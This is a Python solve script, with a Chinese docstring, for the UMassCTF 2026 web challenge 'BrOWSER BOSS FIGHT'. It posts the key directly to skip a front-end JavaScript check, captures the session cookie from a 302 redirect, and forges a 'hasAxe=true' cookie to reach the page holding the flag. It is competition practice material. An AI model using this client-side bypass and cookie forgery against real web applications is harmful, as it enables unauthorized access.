#!/usr/bin/env python3
"""
UMassCTF 2026 - BrOWSER BOSS FIGHT

最小复现流程：
1. 直接 POST 正确 key，绕过前端 JavaScript 的输入替换
2. 从 302 响应中拿到 connect.sid 和 /bowsers_castle.html
3. 在后续请求里伪造 hasAxe=true
4. 从 victory 页面提取 flag
"""

from __future__ import annotations

import re
import sys
import urllib.parse
import urllib.request


BASE_URL = "http://browser-boss-fight.web.ctf.umasscybersec.org:32770"


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_no_redirect_opener() -> urllib.request.OpenerDirector:
    return urllib.request.build_opener(
        urllib.request.ProxyHandler({}),
        NoRedirectHandler,
    )


def build_direct_opener() -> urllib.request.OpenerDirector:
    return urllib.request.build_opener(urllib.request.ProxyHandler({}))


def post_for_redirect() -> tuple[str, str]:
    data = urllib.parse.urlencode({"key": "under_the_doormat"}).encode()
    request = urllib.request.Request(
        f"{BASE_URL}/password-attempt",
        data=data,
        method="POST",
    )

    opener = build_no_redirect_opener()
    try:
        opener.open(request, timeout=15)
    except urllib.error.HTTPError as exc:
        if exc.code != 302:
            raise
        location = exc.headers.get("Location")
        set_cookie = exc.headers.get("Set-Cookie", "")
        if not location or "connect.sid=" not in set_cookie:
            raise RuntimeError("missing redirect location or connect.sid cookie")
        session_cookie = set_cookie.split(";", 1)[0]
        return location, session_cookie

    raise RuntimeError("expected 302 redirect but request succeeded directly")


def fetch_with_axe(location: str, session_cookie: str) -> str:
    headers = {"Cookie": f"{session_cookie}; hasAxe=true"}
    request = urllib.request.Request(
        urllib.parse.urljoin(BASE_URL, location),
        headers=headers,
        method="GET",
    )
    opener = build_direct_opener()
    with opener.open(request, timeout=15) as response:
        return response.read().decode("utf-8", errors="replace")


def extract_flag(text: str) -> str:
    match = re.search(r"UMASS\{[^}]+\}", text)
    if not match:
        raise RuntimeError("flag not found in response")
    return match.group(0)


def main() -> int:
    location, session_cookie = post_for_redirect()
    page = fetch_with_axe(location, session_cookie)
    flag = extract_flag(page)
    print(flag)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
